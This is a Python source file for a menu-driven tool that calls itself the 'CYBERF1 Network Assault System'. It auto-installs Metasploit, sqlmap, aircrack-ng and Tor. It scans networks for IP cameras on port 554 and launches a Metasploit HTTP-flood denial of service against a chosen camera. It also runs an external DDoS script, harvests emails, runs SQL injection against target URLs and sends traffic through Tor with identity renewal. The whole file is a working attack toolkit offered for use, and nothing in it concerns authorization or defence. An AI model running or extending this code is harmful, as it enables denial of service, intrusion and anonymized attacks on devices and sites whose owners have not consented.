import subprocess
import time
import os
import socket
import threading
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
import json
import sys
import platform
import requests
from stem import Signal
from stem.control import Controller

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
BLUE = "\033[94m"
RESET = "\033[0m"

# Hacker-style ASCII art
HACKER_ART = f"""
{CYAN}       .-""""""""-.
     .'          '.
    /   CYBERF1   \
   : ,  ELITE OPS  :
    `._          _.'
       `._[v2.3]_.'  
{GREEN} ____    _  _____ _______   __ _    
/ ___|  / \|_   _| ____\ \ / // \   
\___ \ / _ \ | | |  _|  \ V // _ \  
 ___) / ___ \| | | |___  | |/ ___ \ 
|____/_/   \_\_| |_____| |_/_/   \_{RESET}
{CYAN}   | NETWORK ASSAULT SYSTEM |{RESET}
"""

# Reference to external attack script
nnd_sec_file = "attack.py"

# Function to install a package via a command
def install_package(cmd, name):
    print(f"{BLUE}[*] Attempting to install {name}...{RESET}")
    try:
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}[+] {name} installed successfully.{RESET}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Failed to install {name}: {e}{RESET}")
        return False

# Enhanced dependency setup with auto-install
def setup_dependencies():
    print(f"{BLUE}[*] Initializing dependency check and auto-install...{RESET}")
    os_name = platform.system().lower()

    if sys.version_info.major < 3:
        print(f"{RED}[!] Python 3 required. Current version: {sys.version}{RESET}")
        sys.exit(1)

    # Detect package manager
    pkg_manager = None
    if os_name == "linux":
        if subprocess.run("which apt", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            pkg_manager = "apt"
        elif subprocess.run("which yum", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            pkg_manager = "yum"
    elif os_name == "darwin":
        if subprocess.run("which brew", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
            pkg_manager = "brew"

    dependencies = [
        {"name": "nmap", "pip_package": "python-nmap", "check_cmd": "nmap -V", "install_cmd": "pip install python-nmap", "sys_install": f"{pkg_manager} install -y nmap" if pkg_manager else None},
        {"name": "scapy", "pip_package": "scapy", "check_cmd": "python -c 'import scapy; print(scapy.__version__)'", "install_cmd": "pip install scapy"},
        {"name": "theHarvester", "pip_package": "theharvester", "check_cmd": "theHarvester -h", "install_cmd": "pip install theharvester"},
        {"name": "subfinder", "check_cmd": "subfinder -version", "install_cmd": "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" if os_name != "windows" else "powershell -Command \"iwr -outf subfinder.zip https://github.com/projectdiscovery/subfinder/releases/latest/download/subfinder_{platform.machine()}_windows.zip; Expand-Archive subfinder.zip -DestinationPath .; Remove-Item subfinder.zip\""},
        {"name": "Metasploit", "check_cmd": "msfconsole -v", "install_cmd": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall" if os_name == "linux" else None},
        {"name": "shodan", "pip_package": "shodan", "check_cmd": "python -c 'import shodan'", "install_cmd": "pip install shodan"},
        {"name": "sqlmap", "check_cmd": "sqlmap --version", "install_cmd": "git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git"},
        {"name": "aircrack-ng", "check_cmd": "aircrack-ng -v", "install_cmd": f"{pkg_manager} install -y aircrack-ng" if pkg_manager else None},
        {"name": "tor", "check_cmd": "tor --version", "install_cmd": f"{pkg_manager} install -y tor" if pkg_manager else None},
        {"name": "stem", "pip_package": "stem", "check_cmd": "python -c 'import stem'", "install_cmd": "pip install stem"}
    ]

    for dep in dependencies:
        print(f"{BLUE}[*] Checking {dep['name']}...{RESET}")
        try:
            subprocess.run(dep["check_cmd"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
            print(f"{GREEN}[+] {dep['name']} is installed.{RESET}")
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"{RED}[!] {dep['name']} not found.{RESET}")
            if dep.get("install_cmd"):
                if install_package(dep["install_cmd"], dep["name"]):
                    # Verify installation
                    try:
                        subprocess.run(dep["check_cmd"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                        print(f"{GREEN}[+] {dep['name']} verified post-install.{RESET}")
                    except:
                        print(f"{RED}[!] {dep['name']} installed but not functional.{RESET}")
                        if dep["name"] in ["Metasploit", "subfinder"]:
                            sys.exit(1)
                else:
                    if dep.get("sys_install"):
                        print(f"{BLUE}[*] Attempting system-level install for {dep['name']}...{RESET}")
                        install_package(dep["sys_install"], dep["name"])
            else:
                print(f"{CYAN}[!] {dep['name']} requires manual installation.{RESET}")
                if dep["name"] == "Metasploit" and os_name == "linux":
                    print(f"{CYAN}[>] Run: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall{RESET}")
                elif dep["name"] == "subfinder" and os_name == "windows":
                    print(f"{CYAN}[>] Install Go, then run: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest{RESET}")
            if dep["name"] in ["Metasploit", "subfinder"] and not os.path.exists(dep["check_cmd"].split()[0]):
                print(f"{RED}[!] {dep['name']} is critical. Please install manually and rerun.{RESET}")
                sys.exit(1)

    print(f"{GREEN}[+] Dependency setup complete. Proceeding...{RESET}")
    time.sleep(2)

# === Existing Functions ===
def scan_port_554_nmap(network):
    print(f"{BLUE}[*] Engaging Nmap recon on {network} - Port 554...{RESET}")
    import nmap
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=network, arguments='-p 554 --open -T4')
        found_cameras = False
        print(f"{GREEN}[+] Recon Results:{RESET}")
        for host in nm.all_hosts():
            if 'tcp' in nm[host] and 554 in nm[host]['tcp']:
                print(f"{GREEN}    [+] Target Acquired: {host} - Port 554 EXPOSED{RESET}")
                found_cameras = True
        if not found_cameras:
            print(f"{RED}    [-] No vulnerabilities detected on port 554.{RESET}")
        print(f"{BLUE}[*] Recon terminated.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Critical error in recon: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def discover_devices(network):
    print(f"{BLUE}[*] Initiating live target enumeration on {network}. Terminate with Ctrl+C.{RESET}")
    import scapy.all as scapy
    try:
        while True:
            arp_request = scapy.ARP(pdst=network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"{GREEN}[+] Live Targets (Updates every 5s):{RESET}")
            print(f"{CYAN}{'HOSTNAME':<24} {'IP ADDRESS':<16} {'MAC ADDRESS':<18}{RESET}")
            print(f"{BLUE}{'-' * 60}{RESET}")
            for element in answered_list:
                ip = element[1].psrc
                mac = element[1].hwsrc
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "UNIDENTIFIED"
                print(f"{hostname:<24} {ip:<16} {mac:<18}")
            time.sleep(5)
    except KeyboardInterrupt:
        print(f"{BLUE}[*] Enumeration aborted by operator.{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
    except Exception as e:
        print(f"{RED}[!] Enumeration failure: {e}{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def dos_camera(target_ip):
    print(f"{BLUE}[*] Arming DoS payload for {target_ip}...{RESET}")
    msf_cmd = (
        f"msfconsole -q -x \"use auxiliary/dos/http/http_flood; "
        f"set RHOSTS {target_ip}; "
        f"set TARGETURI /; "
        f"set THREADS 100; "
        f"run; exit\""
    )
    try:
        print(f"{GREEN}[+] Unleashing HTTP flood - 100 threads engaged...{RESET}")
        subprocess.run(msf_cmd, shell=True, check=True)
        print(f"{GREEN}[+] Payload delivered to {target_ip}. Target neutralized.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Payload deployment failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Critical error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def scan_ip_ports(ip):
    port_queue = Queue()
    print_lock = threading.Lock()

    def scan_port(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                result = s.connect_ex((ip, port))
                if result == 0:
                    with print_lock:
                        print(f"{GREEN}    [+] Breach detected: Port {port} OPEN on {ip}{RESET}")
        except socket.error:
            pass

    def worker(ip):
        while not port_queue.empty():
            port = port_queue.get()
            scan_port(ip, port)
            port_queue.task_done()

    start_port = int(input(f"{CYAN}[>] Specify initial port (e.g., 80): {RESET}"))
    end_port = int(input(f"{CYAN}[>] Specify final port (e.g., 65535): {RESET}"))
    print(f"{BLUE}[*] Probing {ip} from port {start_port} to {end_port}...{RESET}")
    
    for port in range(start_port, end_port + 1):
        port_queue.put(port)
    
    thread_count = 100
    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=worker, args=(ip,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    port_queue.join()
    for thread in threads:
        thread.join()
    print(f"{BLUE}[*] Port probing completed.{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def scan_network_554(network_base):
    print(f"{BLUE}[*] Scanning {network_base}.0/24 for port 554 vulnerabilities...{RESET}")
    open_ips = []
    ip_parts = network_base.split('.')
    base_ip = '.'.join(ip_parts[:3]) + '.'

    def is_port_open(ip, port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                return True
        except (socket.timeout, socket.error):
            return False

    def scan_ip_554(ip):
        if is_port_open(ip, 554):
            return ip
        return None

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(scan_ip_554, f"{base_ip}{i}") for i in range(256)]
        for future in futures:
            result = future.result()
            if result:
                open_ips.append(result)

    if open_ips:
        print(f"{GREEN}[+] Vulnerable targets identified:{RESET}")
        for ip in open_ips:
            print(f"    {CYAN}{ip}{RESET}")
    else:
        print(f"{RED}[-] No exploitable targets on port 554.{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def run_nnd_sec_attack():
    if not os.path.exists(nnd_sec_file):
        print(f"{RED}[!] Alert: {nnd_sec_file} not detected in system.{RESET}")
        print(f"{RED}[!] Deploy {nnd_sec_file} to activate this weapon.{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
        return
    
    target_url = input(f"{CYAN}[>] Designate target URL (e.g., http://target.com): {RESET}")
    if not target_url:
        print(f"{RED}[!] Target URL required for engagement.{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
        return
    
    attack_duration = input(f"{CYAN}[>] Set attack duration (seconds, e.g., 60): {RESET}")
    if not attack_duration.isdigit():
        print(f"{RED}[!] Duration must be numeric.{RESET}")
        input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
        return
    
    print(f"{BLUE}[*] Activating {nnd_sec_file} - HTTP Flood Protocol...{RESET}")
    try:
        subprocess.run(["python", nnd_sec_file, target_url, attack_duration], check=True)
        print(f"{GREEN}[+] Assault completed. Target {target_url} compromised.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Assault failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] System error in {nnd_sec_file}: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def run_theharvester(domain):
    print(f"{BLUE}[*] Deploying theHarvester on {domain}...{RESET}")
    try:
        subprocess.run(["theHarvester", "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        cmd = ["theHarvester", "-d", domain, "-b", "all", "-f", f"{domain}_emails"]
        print(f"{GREEN}[+] Harvesting emails from {domain}...{RESET}")
        subprocess.run(cmd, check=True)
        print(f"{GREEN}[+] Harvest complete. Results saved to {domain}_emails.html{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] theHarvester not found. Should have been installed automatically.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Harvesting failed: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def run_hunter_io(domain):
    print(f"{BLUE}[*] Engaging Hunter.io recon on {domain}...{RESET}")
    print(f"{CYAN}[!] Note: Requires Hunter.io API key. Manual execution recommended.{RESET}")
    try:
        print(f"{GREEN}[+] Launching Hunter.io email finder for {domain}...{RESET}")
        print(f"{CYAN}[>] Visit https://hunter.io/ and search '{domain}' manually.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Hunter.io recon failed: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def run_emailhunter(domain):
    print(f"{BLUE}[*] Activating EmailHunter on {domain}...{RESET}")
    print(f"{CYAN}[!] Note: Requires external script 'emailhunter.py'.{RESET}")
    emailhunter_file = "emailhunter.py"
    if not os.path.exists(emailhunter_file):
        print(f"{RED}[!] {emailhunter_file} not found. Deploy it manually.{RESET}")
    else:
        try:
            subprocess.run(["python", emailhunter_file, domain], check=True)
            print(f"{GREEN}[+] EmailHunter completed for {domain}.{RESET}")
        except subprocess.CalledProcessError as e:
            print(f"{RED}[!] EmailHunter failed: {e}{RESET}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def run_subfinder(domain):
    print(f"{BLUE}[*] Engaging Subfinder on {domain}...{RESET}")
    json_output = f"{domain}_subdomains.json"
    try:
        subprocess.run(["subfinder", "-version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        cmd = ["subfinder", "-d", domain, "-oJ", "-o", json_output]
        print(f"{GREEN}[+] Enumerating subdomains for {domain}...{RESET}")
        subprocess.run(cmd, check=True)
        
        if os.path.exists(json_output):
            with open(json_output, 'r') as f:
                subdomains = json.load(f)
            
            if subdomains:
                print(f"{CYAN}[+] NND Subdomain Recon Results:{RESET}")
                print(f"{GREEN}  ┌────── NND ──────┐{RESET}")
                print(f"{GREEN}  │ SUBDOMAIN LIST  │{RESET}")
                print(f"{GREEN}  └─────────────────┘{RESET}")
                for entry in subdomains:
                    subdomain = entry.get("host", "N/A")
                    print(f"{CYAN}    > {subdomain}{RESET}")
                print(f"{GREEN}[+] {len(subdomains)} subdomains acquired.{RESET}")
            else:
                print(f"{RED}[-] No subdomains detected.{RESET}")
            os.remove(json_output)
        else:
            print(f"{RED}[!] JSON output not generated.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Subfinder not found. Should have been installed automatically.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Subfinder failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error processing Subfinder output: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

# === New Functions ===
def shodan_search(query):
    api_key = input(f"{CYAN}[>] Enter Shodan API key (get from shodan.io): {RESET}")
    if not api_key:
        print(f"{RED}[!] API key required.{RESET}")
        return
    import shodan
    api = shodan.Shodan(api_key)
    print(f"{BLUE}[*] Engaging Shodan recon for '{query}'...{RESET}")
    try:
        results = api.search(query)
        print(f"{GREEN}[+] {results['total']} targets acquired:{RESET}")
        for result in results['matches']:
            ip = result['ip_str']
            port = result['port']
            print(f"{CYAN}    > {ip}:{port} - {result.get('org', 'N/A')}{RESET}")
    except shodan.APIError as e:
        print(f"{RED}[!] Shodan error: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def run_sqlmap(target_url):
    print(f"{BLUE}[*] Deploying SQLMap on {target_url}...{RESET}")
    try:
        subprocess.run(["python", "sqlmap/sqlmap.py", "-u", target_url, "--batch", "--dbs"], check=True)
        print(f"{GREEN}[+] SQLMap scan completed.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] SQLMap not found. Should have been installed automatically.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] SQLMap failed: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def wifi_scan():
    print(f"{BLUE}[*] Scanning Wi-Fi networks...{RESET}")
    print(f"{CYAN}[!] Requires root privileges and monitor mode.{RESET}")
    try:
        subprocess.run(["airmon-ng", "start", "wlan0"], check=True)
        subprocess.run(["airodump-ng", "wlan0mon"], check=True)
        print(f"{GREEN}[+] Wi-Fi scan initiated. Check terminal output.{RESET}")
    except FileNotFoundError:
        print(f"{RED}[!] Aircrack-ng not found. Should have been installed automatically.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] Wi-Fi scan failed: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

def renew_tor_ip():
    try:
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print(f"{GREEN}[+] Tor IP renewed.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Tor renewal failed: {e}. Ensure Tor service is running.{RESET}")

def tor_request(url):
    renew_tor_ip()
    proxies = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
    print(f"{BLUE}[*] Sending request via Tor to {url}...{RESET}")
    try:
        response = requests.get(url, proxies=proxies, timeout=10)
        print(f"{GREEN}[+] Response received: {response.status_code}{RESET}")
        print(f"{CYAN}    > {response.text[:100]}...{RESET}")
    except Exception as e:
        print(f"{RED}[!] Tor request failed: {e}{RESET}")
    input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

# Main function with updated menu
def main():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        print(HACKER_ART)
        print(f"{BLUE}=== CYBERF1 NETWORK ASSAULT SYSTEM ==={RESET}")
        print(f"{GREEN}[1] Scan IP Camera (Port 554){RESET}")
        print(f"{GREEN}[2] Scan User Network{RESET}")
        print(f"{GREEN}[3] DoS IP Camera {RESET}")
        print(f"{GREEN}[4] Single IP Port Scan (Threaded){RESET}")
        print(f"{GREEN}[5] Network Port 554 Scan (ThreadPool){RESET}")
        print(f"{GREEN}[6] CYBERF1 DDOS (External){RESET}")
        print(f"{GREEN}[7] theHarvester Email Harvest{RESET}")
        print(f"{GREEN}[9] EmailHunter Domain Sweep{RESET}")
        print(f"{GREEN}[10] Subfinder Subdomain Recon (NND){RESET}")
        print(f"{GREEN}[11] Shodan Device Recon{RESET}")
        print(f"{GREEN}[12] SQLMap Injection Test{RESET}")
        print(f"{GREEN}[13] Wi-Fi Network Scan{RESET}")
        print(f"{GREEN}[14] Tor Anonymized Request{RESET}")
        print(f"{RED}[15] TERMINATE: Exit System{RESET}")
        
        choice = input(f"\n{CYAN}[>] Select operation [1-15]: {RESET}")

        if choice in ['1', '2', '5']:
            network = input(f"{CYAN}[>] Input target network (e.g., 192.168.1): {RESET}")
            if not network:
                print(f"{RED}[!] Network designation required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            
            if choice == '1':
                scan_port_554_nmap(f"{network}.0/24")
            elif choice == '2':
                discover_devices(f"{network}.0/24")
            elif choice == '5':
                scan_network_554(network)

        elif choice == '3':
            target_ip = input(f"{CYAN}[>] Input target IP: {RESET}")
            if not target_ip:
                print(f"{RED}[!] Target IP required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            dos_camera(target_ip)

        elif choice == '4':
            ip = input(f"{CYAN}[>] Input IP for probing (e.g., 192.168.1.1): {RESET}")
            if not ip:
                print(f"{RED}[!] IP designation required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            scan_ip_ports(ip)

        elif choice == '6':
            run_nnd_sec_attack()

        elif choice == '7':
            domain = input(f"{CYAN}[>] Input target domain (e.g., example.com): {RESET}")
            if not domain:
                print(f"{RED}[!] Domain required for harvest.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            run_theharvester(domain)

        elif choice == '8':
            domain = input(f"{CYAN}[>] Input target domain (e.g., example.com): {RESET}")
            if not domain:
                print(f"{RED}[!] Domain required for recon.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            run_hunter_io(domain)

        elif choice == '9':
            domain = input(f"{CYAN}[>] Input target domain (e.g., example.com): {RESET}")
            if not domain:
                print(f"{RED}[!] Domain required for sweep.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            run_emailhunter(domain)

        elif choice == '10':
            domain = input(f"{CYAN}[>] Input target domain (e.g., example.com): {RESET}")
            if not domain:
                print(f"{RED}[!] Domain required for recon.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            run_subfinder(domain)

        elif choice == '11':
            query = input(f"{CYAN}[>] Input Shodan query (e.g., webcam): {RESET}")
            if not query:
                print(f"{RED}[!] Query required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            shodan_search(query)

        elif choice == '12':
            target_url = input(f"{CYAN}[>] Input target URL (e.g., http://example.com/login): {RESET}")
            if not target_url:
                print(f"{RED}[!] URL required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            run_sqlmap(target_url)

        elif choice == '13':
            wifi_scan()

        elif choice == '14':
            url = input(f"{CYAN}[>] Input URL to request via Tor (e.g., http://example.com): {RESET}")
            if not url:
                print(f"{RED}[!] URL required.{RESET}")
                input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")
                continue
            tor_request(url)

        elif choice == '15':
            print(f"{RED}[!] System shutdown initiated. Going dark.{RESET}")
            break

        else:
            print(f"{RED}[!] Invalid operation code. Select 1-15.{RESET}")
            input(f"{CYAN}[>] Acknowledge and proceed [Enter]...{RESET}")

if __name__ == "__main__":
    print(f"{BLUE}[*] Booting CyberF1 Network Assault System...{RESET}")
    setup_dependencies()
    print(f"{GREEN}[+] System online. Ready for engagement.{RESET}")
    time.sleep(1)
    main()